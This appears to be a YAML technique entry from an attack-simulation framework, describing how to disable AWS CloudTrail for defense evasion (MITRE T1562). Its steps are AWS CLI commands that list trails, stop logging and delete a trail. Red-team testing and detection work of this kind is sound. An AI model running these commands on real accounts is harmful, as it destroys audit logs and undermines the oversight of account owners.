name: Disable CloudTrail Logging
description: Attempts to disable or delete CloudTrail to evade detection
mitre_technique: T1562
stage: Defense Evasion
steps:
  - action: aws cloudtrail describe-trails --query 'trailList[*].{Name:Name}'
    description: List all CloudTrails to identify targets
  - action: aws cloudtrail stop-logging --name ${trail_name}
    description: Stop logging to avoid detection of malicious actions
  - action: aws cloudtrail delete-trail --name ${trail_name}
    description: Delete the CloudTrail (optional and destructive)
